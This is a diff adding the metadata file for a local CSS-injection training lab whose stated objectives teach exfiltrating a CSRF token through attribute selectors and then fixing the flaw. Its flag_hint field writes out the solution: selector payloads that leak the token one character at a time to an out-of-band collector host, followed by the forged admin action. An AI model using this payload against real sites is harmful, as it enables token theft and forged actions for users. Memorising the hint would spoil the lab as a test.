@@ -1,0 +1,47 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "css-injection-attr-selector-token-exfil",
+  "title": "CSS Injection — Exfiltrating a CSRF Token via Attribute Selectors",
+  "track": "xss",
+  "difficulty": "expert",
+  "estimated_minutes": 50,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Recognise CSS injection as a data-exfiltration primitive even when a strict CSP (script-src 'none') makes JavaScript impossible — an attacker-controlled stylesheet is still dangerous",
+    "Use CSS attribute selectors + background-image callbacks to leak a secret held in an ATTRIBUTE: input[name=csrf][value^=\"prefix\"]{background:url(...)} fires only when the value starts with the prefix",
+    "Understand this reads only ATTRIBUTE values, never text-node content, and works one character at a time — you extend a known prefix per round, so the leak is inherently sequential",
+    "Chain the leaked secret: use the exfiltrated CSRF token to perform the state-changing action it was meant to protect",
+    "Apply the fixes: don't render untrusted stylesheets on pages holding secrets; scope/allow-list style-src; keep secrets out of attributes on such pages; a per-request/rotating token blunts a slow character-by-character leak"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79", "CWE-201"],
+  "prerequisites": ["csp-jsonp-callback-bypass"],
+  "flag_hint": "The staff /preview (admin-only) renders your POST /styles stylesheet under CSP script-src 'none', next to <input name=csrf value=\"<8 hex>\">. Leak it char-by-char: for each position submit rules input[name=csrf][value^=\"<prefix><c>\"]{background:url(http://collector:9000/report?p=<N>&c=<c>)} for c in 0-9a-f; the bot's preview fires the matching char to the collector. Read /oob/received, extend the prefix, repeat 8x, then POST /admin/action {\"csrf\":\"<token>\"} and POST /solve.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "strict CSP (script-src 'none') on the preview page + attacker-hosted same-origin stylesheet (POST /styles -> /styles.css, no-store)",
+    "CSRF token in an <input value> attribute (the CSS attribute-selector exfil target)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "css-injection",
+    "attribute-selector",
+    "data-exfiltration",
+    "csrf-token-theft",
+    "csp-script-src-none",
+    "scriptless",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79",
+    "cwe-201"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The CSS-attribute-selector data-exfiltration technique (Pepe Vila / Masato Kinugawa CSS-injection research, LiveOverflow's char-by-char CSS leak), abstracted for local Docker with a Flask preview app under strict script-src, a same-origin attacker stylesheet, a Playwright admin bot, and an OOB collector"
+}
